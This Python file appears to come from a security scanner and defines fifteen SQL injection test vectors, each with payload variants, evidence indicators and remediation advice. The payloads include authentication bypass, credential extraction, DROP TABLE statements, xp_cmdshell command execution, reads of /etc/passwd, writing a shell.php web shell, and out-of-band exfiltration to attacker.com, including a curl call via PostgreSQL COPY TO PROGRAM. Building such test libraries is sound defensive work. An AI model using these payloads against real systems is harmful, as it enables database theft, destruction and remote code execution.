"""
SQL Injection Testing Vectors
Classic SQLi, Union-based, Blind, Time-based attacks
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, 
    ConfidenceLevel, SensitivityLevel
)

SQL_INJECTION_VECTORS = [
    TestVector(
        id="sqli-auth-001",
        name="SQL Injection Authentication Bypass",
        description="Classic SQL injection for authentication bypass",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.BODY_JSON, name="username", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="admin' OR '1'='1",
            variants=[
                "admin' OR '1'='1",
                "admin' OR 1=1--",
                "admin'--",
                "admin' OR '1'='1'--",
                "' OR 1=1#",
                "admin') OR ('1'='1",
                "admin' OR 'x'='x"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Login successful", "Admin access granted", "Authentication bypassed"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
        references=["https://owasp.org/www-community/attacks/SQL_Injection"],
        tags=["sqli", "authentication-bypass", "classic"]
    ),
    
    TestVector(
        id="sqli-union-001",
        name="SQL Injection Union-Based",
        description="Union-based SQL injection for data extraction",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1' UNION SELECT NULL,NULL,NULL--",
            variants=[
                "1' UNION SELECT NULL--",
                "1' UNION SELECT NULL,NULL--",
                "1' UNION SELECT 1,2,3--",
                "1' UNION SELECT username,password FROM users--",
                "1' UNION ALL SELECT NULL,NULL,NULL--",
                "-1' UNION SELECT table_name,NULL FROM information_schema.tables--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Additional data in response", "Database schema exposed", "User enumeration"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use parameterized queries. Implement proper error handling. Limit database permissions.",
        references=["https://portswigger.net/web-security/sql-injection/union-attacks"],
        tags=["sqli", "union-based", "data-extraction"]
    ),
    
    TestVector(
        id="sqli-blind-bool-001",
        name="Boolean-Based Blind SQL Injection",
        description="Blind SQLi using boolean conditions",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1' AND '1'='1",
            variants=[
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' AND SUBSTRING(@@version,1,1)='5'--",
                "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Different responses for true/false", "Conditional behavior", "Data inference possible"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use parameterized queries. Implement consistent error handling.",
        references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
        tags=["sqli", "blind", "boolean-based"]
    ),
    
    TestVector(
        id="sqli-time-001",
        name="Time-Based Blind SQL Injection",
        description="Blind SQLi using time delays",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1'; SELECT pg_sleep(5)--",
            variants=[
                "1'; SELECT pg_sleep(5)--",
                "1' AND SLEEP(5)--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' OR IF(1=1, SLEEP(5), 0)--",
                "1'; DBMS_LOCK.SLEEP(5);--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["5 second delay in response", "Time-based data extraction", "Consistent timing"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use parameterized queries. Implement query timeouts.",
        references=["https://portswigger.net/web-security/sql-injection/blind"],
        tags=["sqli", "time-based", "blind"]
    ),
    
    TestVector(
        id="sqli-stacked-001",
        name="Stacked Queries SQL Injection",
        description="SQL injection with multiple statements",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1'; DROP TABLE users--",
            variants=[
                "1'; DROP TABLE users--",
                "1'; UPDATE users SET password='hacked'--",
                "1'; INSERT INTO users VALUES('attacker','password')--",
                "1'; EXEC xp_cmdshell('whoami')--",
                "1'; CREATE USER attacker IDENTIFIED BY 'pass'--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Multiple queries executed", "Data modification", "Database structure changed"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use parameterized queries. Restrict database permissions. Disable multiple statements.",
        references=["https://cwe.mitre.org/data/definitions/89.html"],
        tags=["sqli", "stacked-queries", "destructive"]
    ),
    
    TestVector(
        id="sqli-error-001",
        name="Error-Based SQL Injection",
        description="SQL injection using error messages for data extraction",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
            variants=[
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
                "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
                "1' AND 1=CONVERT(int,(SELECT @@version))--",
                "1' OR 1=1 AND 1=CAST((SELECT @@version) AS INT)--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Database error with sensitive data", "Version in error message", "Schema details leaked"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use parameterized queries. Implement generic error messages. Disable verbose errors.",
        references=["https://portswigger.net/web-security/sql-injection"],
        tags=["sqli", "error-based", "information-disclosure"]
    ),
    
    TestVector(
        id="sqli-second-001",
        name="Second-Order SQL Injection",
        description="SQL injection where payload is stored and executed later",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.BODY_JSON, name="username", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="admin'--",
            variants=[
                "admin'--",
                "test' OR '1'='1",
                "user'); DROP TABLE logs--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Payload stored in database", "Injection triggered on subsequent request", "Delayed execution"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Sanitize data on input AND output. Use parameterized queries everywhere.",
        references=["https://owasp.org/www-community/attacks/SQL_Injection"],
        tags=["sqli", "second-order", "stored"]
    ),
    
    TestVector(
        id="sqli-comment-001",
        name="SQL Injection with Comment Bypass",
        description="SQL injection using various comment syntaxes",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="search", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="test' OR 1=1--",
            variants=[
                "test' OR 1=1--",
                "test' OR 1=1#",
                "test' OR 1=1/*",
                "test' OR 1=1;--",
                "test' OR 1=1-- -",
                "test' OR 1=1;%00"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["SQL comment successful", "Query logic bypassed", "Injection confirmed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use parameterized queries. Filter SQL comment characters.",
        references=["https://cwe.mitre.org/data/definitions/89.html"],
        tags=["sqli", "comment-bypass", "syntax"]
    ),
    
    TestVector(
        id="sqli-hex-001",
        name="SQL Injection with Hex Encoding",
        description="SQL injection using hex-encoded strings",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1' AND 1=0 UNION SELECT 0x61646d696e--",
            variants=[
                "1' AND 1=0 UNION SELECT 0x61646d696e--",
                "1' OR username=0x61646d696e--",
                "1' UNION SELECT CHAR(97,100,109,105,110)--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Hex encoding bypassed filter", "Data extracted", "WAF bypassed"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Use parameterized queries. Implement proper input validation, not just filtering.",
        references=["https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF"],
        tags=["sqli", "hex-encoding", "waf-bypass"]
    ),
    
    TestVector(
        id="sqli-info-schema-001",
        name="SQL Injection - Information Schema Enumeration",
        description="Extract database schema using information_schema",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1' UNION SELECT table_name,NULL FROM information_schema.tables--",
            variants=[
                "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "1' UNION SELECT column_name,data_type FROM information_schema.columns--",
                "1' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
                "1' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema!='mysql'--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Database tables enumerated", "Column names exposed", "Schema structure revealed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use parameterized queries. Restrict information_schema access.",
        references=["https://portswigger.net/web-security/sql-injection/examining-the-database"],
        tags=["sqli", "information-schema", "enumeration"]
    ),
    
    TestVector(
        id="sqli-out-of-band-001",
        name="Out-of-Band SQL Injection",
        description="SQL injection using DNS/HTTP exfiltration",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1'; EXEC xp_dirtree '//attacker.com/a'--",
            variants=[
                "1'; EXEC xp_dirtree '//attacker.com/a'--",
                "1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a')))--",
                "1'; DECLARE @q varchar(1024); SET @q='\\\\\\\\'+@@version+'.attacker.com\\\\a'; EXEC master.dbo.xp_dirtree @q--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["DNS query to attacker domain", "HTTP request to external server", "Data exfiltration"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use parameterized queries. Block outbound connections from database server.",
        references=["https://portswigger.net/web-security/sql-injection/blind"],
        tags=["sqli", "out-of-band", "exfiltration"]
    ),
    
    TestVector(
        id="sqli-postgres-001",
        name="PostgreSQL-Specific SQL Injection",
        description="PostgreSQL-specific injection techniques",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com'--",
            variants=[
                "1'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com'--",
                "1' OR 1=1; SELECT pg_sleep(5)--",
                "1' UNION SELECT NULL,NULL,NULL,version()--",
                "1'; CREATE TABLE pwned(data text)--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["PostgreSQL command executed", "RCE via COPY", "System interaction"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use parameterized queries. Restrict PostgreSQL COPY command. Use least privilege.",
        references=["https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection"],
        tags=["sqli", "postgresql", "rce"]
    ),
    
    TestVector(
        id="sqli-mssql-001",
        name="MSSQL-Specific SQL Injection",
        description="Microsoft SQL Server-specific injection",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1'; EXEC xp_cmdshell 'whoami'--",
            variants=[
                "1'; EXEC xp_cmdshell 'whoami'--",
                "1'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
                "1' UNION SELECT NULL,NULL,NULL,@@version--",
                "1'; WAITFOR DELAY '00:00:05'--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["xp_cmdshell executed", "OS command execution", "System compromise"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use parameterized queries. Disable xp_cmdshell. Use least privilege accounts.",
        references=["https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection"],
        tags=["sqli", "mssql", "rce"]
    ),
    
    TestVector(
        id="sqli-mysql-001",
        name="MySQL-Specific SQL Injection",
        description="MySQL-specific injection techniques",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
            variants=[
                "1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
                "1' INTO OUTFILE '/var/www/html/shell.php'--",
                "1' AND SLEEP(5)--",
                "1' UNION SELECT 1,@@version,user()--",
                "1' OR 1=1 INTO DUMPFILE '/tmp/evil.txt'--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["File read via LOAD_FILE", "File write via INTO OUTFILE", "RCE possible"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Use parameterized queries. Disable FILE privilege. Restrict file operations.",
        references=["https://book.hacktricks.xyz/pentesting-web/sql-injection"],
        tags=["sqli", "mysql", "file-access"]
    ),
    
    TestVector(
        id="sqli-oracle-001",
        name="Oracle-Specific SQL Injection",
        description="Oracle database-specific injection",
        vuln_type=VulnerabilityType.SQLI,
        position=Position(type=PositionType.QUERY, name="id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="1' UNION SELECT NULL,banner FROM v$version--",
            variants=[
                "1' UNION SELECT NULL,banner FROM v$version--",
                "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                "1' UNION SELECT NULL,user FROM dual--",
                "1' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual)=1--"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Oracle version exposed", "Time delay successful", "Data extraction"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use parameterized queries. Restrict access to system views.",
        references=["https://book.hacktricks.xyz/pentesting-web/sql-injection/oracle-injection"],
        tags=["sqli", "oracle", "database-specific"]
    ),
]

# Total vectors: 15
